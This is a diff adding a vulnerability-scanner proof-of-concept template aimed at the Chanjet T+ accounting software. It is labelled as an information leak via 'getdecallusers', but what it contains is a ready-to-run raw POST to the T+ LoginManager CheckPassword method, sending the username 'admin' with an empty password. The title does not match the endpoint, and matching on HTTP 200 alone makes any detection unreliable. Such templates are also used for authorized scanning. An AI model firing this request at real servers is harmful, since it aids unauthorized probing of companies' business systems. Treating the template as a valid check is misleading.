@@ -1,0 +1,51 @@
+id: poc-ppf7zwyg9ybw3d6w
+info:
+  name: 畅捷通 getdecallusers信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ppf7zwyg9ybw3d6w'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ppf7zwyg9ybw3d6w
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /tplus/ajaxpro/Ufida.T.SM.Login.UIP.LoginManager,Ufida.T.SM.Login.UIP.ashx?method=CheckPassword HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Content-Type: application/json
+
+
+
+
+    {"AccountNum": "000", "UserName": "admin", "Password": "", "rdpYear": "2023", "rdpMonth": "5", "rdpDate": "17", "webServiceProcessID": "admin", "ali_csessionid": "", "ali_sig": "", "ali_token": "", "ali_scene": "", "role": "", "aqdKey": "", "fromWhere": "browser", "cardNo": ""}
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    error
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
